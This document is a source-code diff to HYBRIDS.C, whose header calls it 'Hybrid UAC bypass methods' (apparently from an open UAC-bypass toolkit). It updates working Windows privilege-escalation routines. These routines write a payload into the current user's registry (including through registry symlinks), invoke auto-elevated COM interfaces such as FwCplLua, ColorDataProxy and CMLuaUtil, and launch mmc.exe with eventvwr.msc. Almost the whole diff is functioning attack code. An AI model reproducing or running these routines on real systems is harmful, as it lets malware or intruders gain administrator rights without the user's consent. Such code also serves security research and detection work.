@@ -4,9 +4,9 @@
 *
 *  TITLE:       HYBRIDS.C
 *
-*  VERSION:     2.89
+*  VERSION:     2.90
 *
-*  DATE:        14 June 2018
+*  DATE:        10 July 2018
 *
 *  Hybrid UAC bypass methods.
 *
@@ -1785,7 +1785,7 @@ BOOL ucmJunctionMethod(
 }
 
 /*
-* ucmSXSMethodDccw
+* ucmSXSDccwMethod
 *
 * Purpose:
 *
@@ -1793,7 +1793,7 @@ BOOL ucmJunctionMethod(
 * Dccw idea by Ernesto Fernandez (https://github.com/L3cr0f/DccwBypassUAC)
 *
 */
-BOOL ucmSXSMethodDccw(
+BOOL ucmSXSDccwMethod(
     _In_ PVOID ProxyDll,
     _In_ DWORD ProxyDllSize
 )
@@ -1911,7 +1911,7 @@ BOOL ucmSXSMethodDccw(
 }
 
 /*
-* ucmMethodCorProfiler
+* ucmCorProfilerMethod
 *
 * Purpose:
 *
@@ -1919,7 +1919,7 @@ BOOL ucmSXSMethodDccw(
 * http://seclists.org/fulldisclosure/2017/Jul/11
 *
 */
-BOOL ucmMethodCorProfiler(
+BOOL ucmCorProfilerMethod(
     _In_ PVOID ProxyDll,
     _In_ DWORD ProxyDllSize
 )
@@ -2035,11 +2035,13 @@ BOOL ucmFwCplLuaMethod(
 )
 {
     HRESULT          r = E_FAIL;
-    BOOL             bCond = FALSE;
+    BOOL             bCond = FALSE, bSymLinkCleanup = FALSE;
 
     LRESULT          lResult;
     HKEY             hKey = NULL;
     SIZE_T           sz = 0;
+
+    DWORD            dwKeyDisposition = 0;
 
     IID              xIIDFwCplLua;
     IFwCplLua       *FwCplLua = NULL;
@@ -2048,12 +2050,17 @@ BOOL ucmFwCplLuaMethod(
 
     do {
 
+#ifdef _DEBUG
+        g_ctx.MethodExecuteType = ucmExTypeRemediationRequired;
+#endif
+
+        RtlSecureZeroMemory(szKey, sizeof(szKey));
+
         //
         // Query IID for FwCplLua.
         //
-        if (IIDFromString(T_IID_IFwCplLua, &xIIDFwCplLua) != S_OK) {
+        if (IIDFromString(T_IID_IFwCplLua, &xIIDFwCplLua) != S_OK)
             break;
-        }
 
         sz = _strlen(lpszPayload);
         if (sz == 0)
@@ -2072,28 +2079,40 @@ BOOL ucmFwCplLuaMethod(
             MAXIMUM_ALLOWED,
             NULL,
             &hKey,
-            NULL);
+            &dwKeyDisposition);
 
         if (lResult != ERROR_SUCCESS)
             break;
 
         //
         // Set "Default" value as our payload.
-        //
+        // 
         sz = (1 + sz) * sizeof(WCHAR);
-        lResult = RegSetValueEx(
-            hKey,
-            TEXT(""),
-            0,
-            REG_SZ,
-            (BYTE*)lpszPayload,
-            (DWORD)sz);
+        if (g_ctx.MethodExecuteType == ucmExTypeRemediationRequired) {
 
-        if (lResult != ERROR_SUCCESS)
-            break;
+            if (NT_SUCCESS(wdRegSetValueIndirectHKCU(szKey, NULL, lpszPayload, (ULONG)sz))) {
+                bSymLinkCleanup = TRUE;
+                lResult = ERROR_SUCCESS;
+            }
+
+        }
+        else {
+          
+            lResult = RegSetValueEx(
+                hKey,
+                TEXT(""),
+                0,
+                REG_SZ,
+                (BYTE*)lpszPayload,
+                (DWORD)sz);          
+
+        }
 
         RegCloseKey(hKey);
         hKey = NULL;
+
+        if (lResult != ERROR_SUCCESS)
+            break;
 
         //
         // Get elevated COM object for FwCplLua interface.
@@ -2127,6 +2146,20 @@ BOOL ucmFwCplLuaMethod(
         FwCplLua->lpVtbl->Release(FwCplLua);
     }
 
+    //
+    // Remove symlink.
+    //
+    if (g_ctx.MethodExecuteType == ucmExTypeRemediationRequired) {
+        if (bSymLinkCleanup)
+            wdRemoveRegLinkHKCU();
+    }
+
+    //
+    // Remove key with all subkeys.
+    //
+    if (dwKeyDisposition == REG_CREATED_NEW_KEY)
+        supDeleteKeyRecursive(HKEY_CURRENT_USER, T_MSC_SHELL);
+
     return SUCCEEDED(r);
 }
 
@@ -2137,6 +2170,10 @@ BOOL ucmFwCplLuaMethod(
 *
 * Bypass UAC using ColorDataProxy/CCMLuaUtil undocumented COM interfaces.
 * This function expects that supMasqueradeProcess was called on process initialization.
+*
+* Notes:
+*
+* Remote call of ColorDataProxy is broken on Windows 10 RS5 starting from 17711, likely bug.
 *
 */
 BOOL ucmDccwCOMMethod(
@@ -2172,8 +2209,9 @@ BOOL ucmDccwCOMMethod(
             &xIID_ICMLuaUtil,
             &CMLuaUtil);
 
-        if (r != S_OK)
+        if (r != S_OK) {
             break;
+        }
 
         if (CMLuaUtil == NULL) {
             r = E_FAIL;
@@ -2189,8 +2227,9 @@ BOOL ucmDccwCOMMethod(
             T_CALIBRATOR_VALUE,
             lpszPayload);
 
-        if (FAILED(r))
+        if (FAILED(r)) {
             break;
+        }   
 
         //
         // Create elevated COM object for ColorDataProxy.
@@ -2205,8 +2244,10 @@ BOOL ucmDccwCOMMethod(
             &xIID_IColorDataProxy,
             &ColorDataProxy);
 
-        if (r != S_OK)
+        if (r != S_OK) {
+            supDebugPrint(L"ucmMasqueradedCoGetObjectElevate(ColorDataProxy)", r);
             break;
+        }
 
         if (ColorDataProxy == NULL) {
             r = E_FAIL;
@@ -2541,7 +2582,6 @@ BOOL ucmCOMHandlersMethod2(
         //
         // Run target.
         //
-
         bResult = supRunProcess(MMC_EXE, EVENTVWR_MSC);
 
     } while (bCond);
